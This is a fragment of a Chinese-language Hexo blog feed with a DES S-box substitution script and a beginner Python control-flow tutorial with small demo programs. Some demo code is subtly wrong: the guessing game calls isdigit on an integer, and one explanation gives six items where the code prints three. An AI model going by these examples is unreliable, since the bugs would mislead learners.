class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> random<br><br><span class="hljs-comment"># 生成 48 比特的二进制字符串</span><br>binary_input = <span class="hljs-string">&#x27;&#x27;</span>.join(random.choice(<span class="hljs-string">&#x27;01&#x27;</span>) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">48</span>))<br><br><br>S_BOX = [<br>    [<span class="hljs-number">14</span>, <span class="hljs-number">4</span>, <span class="hljs-number">13</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">15</span>, <span class="hljs-number">11</span>, <span class="hljs-number">8</span>, <span class="hljs-number">3</span>, <span class="hljs-number">10</span>, <span class="hljs-number">6</span>, <span class="hljs-number">12</span>, <span class="hljs-number">5</span>, <span class="hljs-number">9</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span>,<br>     <span class="hljs-number">0</span>, <span class="hljs-number">15</span>, <span class="hljs-number">7</span>, <span class="hljs-number">4</span>, <span class="hljs-number">14</span>, <span class="hljs-number">2</span>, <span class="hljs-number">13</span>, <span class="hljs-number">1</span>, <span class="hljs-number">10</span>, <span class="hljs-number">6</span>, <span class="hljs-number">12</span>, <span class="hljs-number">11</span>, <span class="hljs-number">9</span>, <span class="hljs-number">5</span>, <span class="hljs-number">3</span>, <span class="hljs-number">8</span>,<br>     <span class="hljs-number">4</span>, <span class="hljs-number">1</span>, <span class="hljs-number">14</span>, <span class="hljs-number">8</span>, <span class="hljs-number">13</span>, <span class="hljs-number">6</span>, <span class="hljs-number">2</span>, <span class="hljs-number">11</span>, <span class="hljs-number">15</span>, <span class="hljs-number">12</span>, <span class="hljs-number">9</span>, <span class="hljs-number">7</span>, <span class="hljs-number">3</span>, <span class="hljs-number">10</span>, <span class="hljs-number">5</span>, <span class="hljs-number">0</span>,<br>     <span class="hljs-number">15</span>, <span class="hljs-number">12</span>, <span class="hljs-number">8</span>, <span class="hljs-number">2</span>, <span class="hljs-number">4</span>, <span class="hljs-number">9</span>, <span class="hljs-number">1</span>, <span class="hljs-number">7</span>, <span class="hljs-number">5</span>, <span class="hljs-number">11</span>, <span class="hljs-number">3</span>, <span class="hljs-number">14</span>, <span class="hljs-number">10</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">13</span>],<br><br>    [<span class="hljs-number">15</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">14</span>, <span class="hljs-number">6</span>, <span class="hljs-number">11</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">9</span>, <span class="hljs-number">7</span>, <span class="hljs-number">2</span>, <span class="hljs-number">13</span>, <span class="hljs-number">12</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>, <span class="hljs-number">10</span>,<br>     <span class="hljs-number">3</span>, <span class="hljs-number">13</span>, <span class="hljs-number">4</span>, <span class="hljs-number">7</span>, <span class="hljs-number">15</span>, <span class="hljs-number">2</span>, <span class="hljs-number">8</span>, <span class="hljs-number">14</span>, <span class="hljs-number">12</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">10</span>, <span class="hljs-number">6</span>, <span class="hljs-number">9</span>, <span class="hljs-number">11</span>, <span class="hljs-number">5</span>,<br>     <span class="hljs-number">0</span>, <span class="hljs-number">14</span>, <span class="hljs-number">7</span>, <span class="hljs-number">11</span>, <span class="hljs-number">10</span>, <span class="hljs-number">4</span>, <span class="hljs-number">13</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">8</span>, <span class="hljs-number">12</span>, <span class="hljs-number">6</span>, <span class="hljs-number">9</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">15</span>,<br>     <span class="hljs-number">13</span>, <span class="hljs-number">8</span>, <span class="hljs-number">10</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">15</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">11</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">12</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>, <span class="hljs-number">14</span>, <span class="hljs-number">9</span>],<br><br>    [<span class="hljs-number">10</span>, <span class="hljs-number">0</span>, <span class="hljs-number">9</span>, <span class="hljs-number">14</span>, <span class="hljs-number">6</span>, <span class="hljs-number">3</span>, <span class="hljs-number">15</span>, <span class="hljs-number">5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">13</span>, <span class="hljs-number">12</span>, <span class="hljs-number">7</span>, <span class="hljs-number">11</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">8</span>,<br>     <span class="hljs-number">13</span>, <span class="hljs-number">7</span>, <span class="hljs-number">0</span>, <span class="hljs-number">9</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">6</span>, <span class="hljs-number">10</span>, <span class="hljs-number">2</span>, <span class="hljs-number">8</span>, <span class="hljs-number">5</span>, <span class="hljs-number">14</span>, <span class="hljs-number">12</span>, <span class="hljs-number">11</span>, <span class="hljs-number">15</span>, <span class="hljs-number">1</span>,<br>     <span class="hljs-number">13</span>, <span class="hljs-number">6</span>, <span class="hljs-number">4</span>, <span class="hljs-number">9</span>, <span class="hljs-number">8</span>, <span class="hljs-number">15</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">11</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">12</span>, <span class="hljs-number">5</span>, <span class="hljs-number">10</span>, <span class="hljs-number">14</span>, <span class="hljs-number">7</span>,<br>     <span class="hljs-number">1</span>, <span class="hljs-number">10</span>, <span class="hljs-number">13</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">9</span>, <span class="hljs-number">8</span>, <span class="hljs-number">7</span>, <span class="hljs-number">4</span>, <span class="hljs-number">15</span>, <span class="hljs-number">14</span>, <span class="hljs-number">3</span>, <span class="hljs-number">11</span>, <span class="hljs-number">5</span>, <span class="hljs-number">2</span>, <span class="hljs-number">12</span>],<br><br>    [<span class="hljs-number">7</span>, <span class="hljs-number">13</span>, <span class="hljs-number">14</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">8</span>, <span class="hljs-number">5</span>, <span class="hljs-number">11</span>, <span class="hljs-number">12</span>, <span class="hljs-number">4</span>, <span class="hljs-number">15</span>,<br>     <span class="hljs-number">13</span>, <span class="hljs-number">8</span>, <span class="hljs-number">11</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">7</span>, <span class="hljs-number">2</span>, <span class="hljs-number">12</span>, <span class="hljs-number">1</span>, <span class="hljs-number">10</span>, <span class="hljs-number">14</span>, <span class="hljs-number">9</span>,<br>     <span class="hljs-number">10</span>, <span class="hljs-number">6</span>, <span class="hljs-number">9</span>, <span class="hljs-number">0</span>, <span class="hljs-number">12</span>, <span class="hljs-number">11</span>, <span class="hljs-number">7</span>, <span class="hljs-number">13</span>, <span class="hljs-number">15</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">14</span>, <span class="hljs-number">5</span>, <span class="hljs-number">2</span>, <span class="hljs-number">8</span>, <span class="hljs-number">4</span>,<br>     <span class="hljs-number">3</span>, <span class="hljs-number">15</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">10</span>, <span class="hljs-number">1</span>, <span class="hljs-number">13</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">11</span>, <span class="hljs-number">12</span>, <span class="hljs-number">7</span>, <span class="hljs-number">2</span>, <span class="hljs-number">14</span>],<br><br>    [<span class="hljs-number">2</span>, <span class="hljs-number">12</span>, <span class="hljs-number">4</span>, <span class="hljs-number">1</span>, <span class="hljs-number">7</span>, <span class="hljs-number">10</span>, <span class="hljs-number">11</span>, <span class="hljs-number">6</span>, <span class="hljs-number">8</span>, <span class="hljs-number">5</span>, <span class="hljs-number">3</span>, <span class="hljs-number">15</span>, <span class="hljs-number">13</span>, <span class="hljs-number">0</span>, <span class="hljs-number">14</span>, <span class="hljs-number">9</span>,<br>     <span class="hljs-number">14</span>, <span class="hljs-number">11</span>, <span class="hljs-number">2</span>, <span class="hljs-number">12</span>, <span class="hljs-number">4</span>, <span class="hljs-number">7</span>, <span class="hljs-number">13</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">0</span>, <span class="hljs-number">15</span>, <span class="hljs-number">10</span>, <span class="hljs-number">3</span>, <span class="hljs-number">9</span>, <span class="hljs-number">8</span>, <span class="hljs-number">6</span>,<br>     <span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">11</span>, <span class="hljs-number">10</span>, <span class="hljs-number">13</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">15</span>, <span class="hljs-number">9</span>, <span class="hljs-number">12</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">14</span>,<br>     <span class="hljs-number">11</span>, <span class="hljs-number">8</span>, <span class="hljs-number">12</span>, <span class="hljs-number">7</span>, <span class="hljs-number">1</span>, <span class="hljs-number">14</span>, <span class="hljs-number">2</span>, <span class="hljs-number">13</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">0</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">3</span>],<br><br>    [<span class="hljs-number">12</span>, <span class="hljs-number">1</span>, <span class="hljs-number">10</span>, <span class="hljs-number">15</span>, <span class="hljs-number">9</span>, <span class="hljs-number">2</span>, <span class="hljs-number">6</span>, <span class="hljs-number">8</span>, <span class="hljs-number">0</span>, <span class="hljs-number">13</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">14</span>, <span class="hljs-number">7</span>, <span class="hljs-number">5</span>, <span class="hljs-number">11</span>,<br>     <span class="hljs-number">10</span>, <span class="hljs-number">15</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">7</span>, <span class="hljs-number">12</span>, <span class="hljs-number">9</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">1</span>, <span class="hljs-number">13</span>, <span class="hljs-number">14</span>, <span class="hljs-number">0</span>, <span class="hljs-number">11</span>, <span class="hljs-number">3</span>, <span class="hljs-number">8</span>,<br>     <span class="hljs-number">9</span>, <span class="hljs-number">14</span>, <span class="hljs-number">15</span>, <span class="hljs-number">5</span>, <span class="hljs-number">2</span>, <span class="hljs-number">8</span>, <span class="hljs-number">12</span>, <span class="hljs-number">3</span>, <span class="hljs-number">7</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>, <span class="hljs-number">10</span>, <span class="hljs-number">1</span>, <span class="hljs-number">13</span>, <span class="hljs-number">11</span>, <span class="hljs-number">6</span>,<br>     <span class="hljs-number">4</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">12</span>, <span class="hljs-number">9</span>, <span class="hljs-number">5</span>, <span class="hljs-number">15</span>, <span class="hljs-number">10</span>, <span class="hljs-number">11</span>, <span class="hljs-number">14</span>, <span class="hljs-number">1</span>, <span class="hljs-number">7</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">8</span>, <span class="hljs-number">13</span>],<br><br>    [<span class="hljs-number">4</span>, <span class="hljs-number">11</span>, <span class="hljs-number">2</span>, <span class="hljs-number">14</span>, <span class="hljs-number">15</span>, <span class="hljs-number">0</span>, <span class="hljs-number">8</span>, <span class="hljs-number">13</span>, <span class="hljs-number">3</span>, <span class="hljs-number">12</span>, <span class="hljs-number">9</span>, <span class="hljs-number">7</span>, <span class="hljs-number">5</span>, <span class="hljs-number">10</span>, <span class="hljs-number">6</span>, <span class="hljs-number">1</span>,<br>     <span class="hljs-number">13</span>, <span class="hljs-number">0</span>, <span class="hljs-number">11</span>, <span class="hljs-number">7</span>, <span class="hljs-number">4</span>, <span class="hljs-number">9</span>, <span class="hljs-number">1</span>, <span class="hljs-number">10</span>, <span class="hljs-number">14</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>, <span class="hljs-number">12</span>, <span class="hljs-number">2</span>, <span class="hljs-number">15</span>, <span class="hljs-number">8</span>, <span class="hljs-number">6</span>,<br>     <span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">11</span>, <span class="hljs-number">13</span>, <span class="hljs-number">12</span>, <span class="hljs-number">3</span>, <span class="hljs-number">7</span>, <span class="hljs-number">14</span>, <span class="hljs-number">10</span>, <span class="hljs-number">15</span>, <span class="hljs-number">6</span>, <span class="hljs-number">8</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>, <span class="hljs-number">9</span>, <span class="hljs-number">2</span>,<br>     <span class="hljs-number">6</span>, <span class="hljs-number">11</span>, <span class="hljs-number">13</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">10</span>, <span class="hljs-number">7</span>, <span class="hljs-number">9</span>, <span class="hljs-number">5</span>, <span class="hljs-number">0</span>, <span class="hljs-number">15</span>, <span class="hljs-number">14</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">12</span>],<br><br>    [<span class="hljs-number">13</span>, <span class="hljs-number">2</span>, <span class="hljs-number">8</span>, <span class="hljs-number">4</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">11</span>, <span class="hljs-number">1</span>, <span class="hljs-number">10</span>, <span class="hljs-number">9</span>, <span class="hljs-number">3</span>, <span class="hljs-number">14</span>, <span class="hljs-number">5</span>, <span class="hljs-number">0</span>, <span class="hljs-number">12</span>, <span class="hljs-number">7</span>,<br>     <span class="hljs-number">1</span>, <span class="hljs-number">15</span>, <span class="hljs-number">13</span>, <span class="hljs-number">8</span>, <span class="hljs-number">10</span>, <span class="hljs-number">3</span>, <span class="hljs-number">7</span>, <span class="hljs-number">4</span>, <span class="hljs-number">12</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">11</span>, <span class="hljs-number">0</span>, <span class="hljs-number">14</span>, <span class="hljs-number">9</span>, <span class="hljs-number">2</span>,<br>     <span class="hljs-number">7</span>, <span class="hljs-number">11</span>, <span class="hljs-number">4</span>, <span class="hljs-number">1</span>, <span class="hljs-number">9</span>, <span class="hljs-number">12</span>, <span class="hljs-number">14</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">10</span>, <span class="hljs-number">13</span>, <span class="hljs-number">15</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>, <span class="hljs-number">8</span>,<br>     <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">14</span>, <span class="hljs-number">7</span>, <span class="hljs-number">4</span>, <span class="hljs-number">10</span>, <span class="hljs-number">8</span>, <span class="hljs-number">13</span>, <span class="hljs-number">15</span>, <span class="hljs-number">12</span>, <span class="hljs-number">9</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">11</span>]]<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">s_box</span>(<span class="hljs-params">binstr</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;s盒：48bit-&gt;32bit&quot;&quot;&quot;</span><br>    box = <span class="hljs-number">0</span>  <span class="hljs-comment"># S盒的索引</span><br>    res = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(binstr), <span class="hljs-number">6</span>):<br>        tmp = binstr[i:i + <span class="hljs-number">6</span>]<br>        row = <span class="hljs-built_in">int</span>(tmp[<span class="hljs-number">0</span>] + tmp[<span class="hljs-number">5</span>], <span class="hljs-number">2</span>)<br>        col = <span class="hljs-built_in">int</span>(tmp[<span class="hljs-number">1</span>:<span class="hljs-number">5</span>], <span class="hljs-number">2</span>)<br><br>        num = <span class="hljs-built_in">bin</span>(S_BOX[box][<span class="hljs-number">16</span> * row + col])[<span class="hljs-number">2</span>:]<br>        num = <span class="hljs-string">&#x27;0&#x27;</span> * (<span class="hljs-number">4</span> - <span class="hljs-built_in">len</span>(num)) + num  <span class="hljs-comment"># 以0左补全4位</span><br><br>        res += num<br>        box += <span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">return</span> res<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bit_to_hex</span>(<span class="hljs-params">bitstr</span>):<br>    <span class="hljs-string">&quot;&quot;&quot; 二进制比特流-&gt;十六进制字符串 &quot;&quot;&quot;</span><br>    bitlst = [bitstr[i:i + <span class="hljs-number">4</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(bitstr), <span class="hljs-number">4</span>)]<br>    hexlst = [<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">int</span>(i, <span class="hljs-number">2</span>))[<span class="hljs-number">2</span>:].lower() <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> bitlst]<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(hexlst)<br><br><br>output = s_box(binary_input)<br>output_hex = bit_to_hex(output)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;替换后的结果:&quot;</span>, output_hex)<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 密码学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> s盒 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python（一）</title>
      <link href="/2024/04/17/Python%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80-%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6/"/>
      <url>/2024/04/17/Python%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80-%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<h2 id="Python语言基础-流程控制"><a href="#Python语言基础-流程控制" class="headerlink" title="Python语言基础-流程控制"></a>Python语言基础-流程控制</h2><p>Python语言的基础流程控制包括条件语句（if语句）、循环语句（for循环和while循环）以及跳转语句（break、continue和return语句）。即：</p><ol><li><strong>条件语句（if语句）</strong>：if语句用于根据条件执行代码块。它可以包含一个或多个条件以及相应的代码块。Python使用缩进来表示代码块。</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> condition1:<br>    <span class="hljs-comment"># 如果条件1为真，则执行这里的代码</span><br><span class="hljs-keyword">elif</span> condition2:<br>    <span class="hljs-comment"># 如果条件2为真，则执行这里的代码</span><br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-comment"># 如果以上条件都不满足，则执行这里的代码</span><br></code></pre></td></tr></table></figure><ol start="2"><li><strong>循环语句</strong>：</li></ol><ul><li><strong>for循环</strong>：用于迭代可迭代对象（如列表、元组、字典等）中的元素。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> iterable:<br>    <span class="hljs-comment"># 对每个元素执行的代码</span><br></code></pre></td></tr></table></figure><ul><li><strong>while循环</strong>：在条件为真时重复执行代码块，直到条件为假为止。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">while</span> condition:<br>    <span class="hljs-comment"># 在条件为真时执行的代码</span><br></code></pre></td></tr></table></figure><ol start="3"><li><strong>跳转语句</strong>：<ul><li><strong>break语句</strong>：用于跳出循环，即使循环条件没有变为False。</li><li><strong>continue语句</strong>：用于跳过循环体中的剩余代码，继续下一次循环。</li><li><strong>return语句</strong>：用于从函数中返回值，并结束函数的执行。</li></ul></li></ol><p>这些是Python中基础的流程控制结构，它们可以帮助你编写更加灵活和功能强大的程序。</p><p>some  demos：</p><p>1.计算平均成绩代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">total=<span class="hljs-number">0</span>;ave=<span class="hljs-number">0</span>;count=<span class="hljs-number">0</span>;<br>score=<span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入学生英语成绩：&quot;</span>))<br><span class="hljs-keyword">while</span> score != -<span class="hljs-number">1</span>:<br>    total=total+score<br>    count=count+<span class="hljs-number">1</span><br>    score=<span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入学生英语成绩：&quot;</span>))<br><span class="hljs-keyword">if</span> count != <span class="hljs-number">0</span>:<br>    average = total / count  <span class="hljs-comment"># 如果count为0时，这里会导致ZeroDivisionError，可以加上判断条件避免除零错误-1</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;录入学生英语成绩 %d 份，学生英语总成绩 %d，平均成绩 %4.2f.&quot;</span> % (count, total, average))<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;没有录入学生英语成绩。&quot;</span>)<br></code></pre></td></tr></table></figure><p>代码逻辑：首先输入第一个学生的成绩然后进入while循环，输入完所有数据后输入-1跳出循环，计算并输出结果</p><p>优化：average &#x3D; total &#x2F; count  后加上判断条件避免除零错误-1 </p><p>2.列表输出代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">universities = [<span class="hljs-string">&#x27;哈佛大学&#x27;</span>,<span class="hljs-string">&#x27;斯坦福大学&#x27;</span>,<span class="hljs-string">&#x27;剑桥大学&#x27;</span>,<span class="hljs-string">&#x27;麻省理工学院&#x27;</span>,<span class="hljs-string">&#x27;加州大学-伯克利&#x27;</span>,<span class="hljs-string">&#x27;普林\</span><br><span class="hljs-string">斯顿大学&#x27;</span>,<span class="hljs-string">&#x27;牛津大学&#x27;</span>,<span class="hljs-string">&#x27;哥伦比亚大学&#x27;</span>,<span class="hljs-string">&#x27;加州理工学院&#x27;</span>,<span class="hljs-string">&#x27;芝加哥大学&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;2017《Times》世界大学排名前3的大学是：&quot;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>(i+<span class="hljs-number">1</span>)+<span class="hljs-string">&quot;.&quot;</span>,universities[i])<br></code></pre></td></tr></table></figure><p>代码逻辑：首先定义了一个包含了若干大学名称的列表，然后通过一个循环打印出了这个列表中前6个元素（大学名称），每个元素前面带有相应的排名</p><p>3.猜数字大小代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> random<br>key = random.randint(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;------猜数字游戏开始！------&#x27;</span>)<br>count = <span class="hljs-number">0</span><br>x= <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;请输入数字：&#x27;</span>))<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-comment"># 检查输入是否为数字</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> x.isdigit():<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;请输入一个有效的数字！&#x27;</span>)<br>        <span class="hljs-keyword">continue</span><br>    count = count + <span class="hljs-number">1</span><br>    <span class="hljs-keyword">if</span> x &gt; key:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;您猜的数字大了！&#x27;</span>)<br>    <span class="hljs-keyword">elif</span> x &lt; key:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;您猜的数字小了！&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;恭喜您，猜对了！&#x27;</span>)<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">if</span> count &gt;= <span class="hljs-number">5</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;很遗憾，您没猜中！生成数字是：%d.&#x27;</span>%key)<br>        <span class="hljs-keyword">break</span><br>    x=<span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入数字：&quot;</span>))<br></code></pre></td></tr></table></figure><p>4.斐波那契数列代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">n1=<span class="hljs-number">1</span><br>n2=<span class="hljs-number">1</span><br>count=<span class="hljs-number">2</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;斐波那契数列前10项为:&quot;</span>,end=<span class="hljs-string">&quot; &quot;</span>)<br><span class="hljs-built_in">print</span>(n1,n2,end=<span class="hljs-string">&quot; &quot;</span>)<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">if</span> count&gt;=<span class="hljs-number">10</span>:<br>     <span class="hljs-keyword">break</span><br>    nth=n1+n2<br>    <span class="hljs-built_in">print</span>(nth,end=<span class="hljs-string">&quot; &quot;</span>)<br>    n1=n2<br>    n2=nth<br>    count+=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>代码逻辑：首先定义了 n1&#x3D;1、n2&#x3D;1、count&#x3D;2，然后使用 print() 函数输出前两项的值，并设置 end&#x3D;” “，使得输出不换行而是在同一行显示。接着进入一个 while 的循环，每次循环计算下一个斐波那契数，并输出该数，然后更新 n1、n2 的值，同时 count 加一，直到 count 达到 10 时退出循环. </p><p> OR:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">fibonacci</span>(<span class="hljs-params">n</span>):<br>    fib_seq = [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>]     